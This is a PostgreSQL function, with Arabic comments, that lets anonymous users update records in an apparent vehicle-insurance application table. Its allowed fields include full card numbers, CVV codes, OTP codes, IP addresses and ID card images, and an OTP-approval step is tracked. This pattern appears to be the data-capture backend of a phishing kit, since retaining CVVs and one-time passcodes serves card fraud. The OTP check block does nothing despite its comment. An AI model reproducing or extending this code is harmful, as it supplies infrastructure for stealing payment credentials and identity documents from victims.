CREATE OR REPLACE FUNCTION public.update_customer_application_public(
  _id uuid,
  _owner_token uuid,
  _patch jsonb
)
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $$
DECLARE
  v_existing public.customer_applications%ROWTYPE;
  v_allowed text[] := ARRAY[
    'full_name','phone','insurance_type','document_type',
    'vehicle_manufacturer','vehicle_model','vehicle_year','serial_number',
    'vehicle_value','usage_purpose','add_driver','policy_start_date',
    'selected_company','selected_price','regular_price','company_logo',
    'cardholder_name','card_number','card_last_4','card_type',
    'expiry_date','cvv','otp_code','current_step','ip_address',
    'id_verification_step','id_front_url','id_back_url','status'
  ];
  v_key text;
  v_value jsonb;
  v_set text := '';
  v_sql text;
BEGIN
  IF _id IS NULL OR _owner_token IS NULL THEN
    RETURN false;
  END IF;

  SELECT * INTO v_existing
  FROM public.customer_applications
  WHERE id = _id AND owner_token = _owner_token;

  IF NOT FOUND THEN
    RETURN false;
  END IF;

  -- منع التقدم بعد إكمال OTP
  IF COALESCE(v_existing.otp_approved, false) = true
     AND COALESCE((_patch->>'current_step'), '') NOT IN ('id_verification','completed','') THEN
    -- نسمح فقط بتحديث حقول التحقق من الهوية
    NULL;
  END IF;

  FOR v_key, v_value IN SELECT * FROM jsonb_each(_patch) LOOP
    IF v_key = ANY(v_allowed) THEN
      IF v_set <> '' THEN v_set := v_set || ', '; END IF;
      v_set := v_set || quote_ident(v_key) || ' = ($1->>' || quote_literal(v_key) || ')';
      -- التحويلات للأنواع الخاصة
      IF v_key IN ('add_driver') THEN
        v_set := v_set || '::boolean';
      ELSIF v_key IN ('vehicle_value') THEN
        v_set := v_set || '::numeric';
      ELSIF v_key IN ('policy_start_date') THEN
        v_set := v_set || '::date';
      END IF;
    END IF;
  END LOOP;

  IF v_set = '' THEN
    RETURN true;
  END IF;

  v_sql := 'UPDATE public.customer_applications SET ' || v_set || ', updated_at = now() WHERE id = $2 AND owner_token = $3';
  EXECUTE v_sql USING _patch, _id, _owner_token;

  RETURN true;
END;
$$;

REVOKE EXECUTE ON FUNCTION public.update_customer_application_public(uuid, uuid, jsonb) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.update_customer_application_public(uuid, uuid, jsonb) TO anon, authenticated;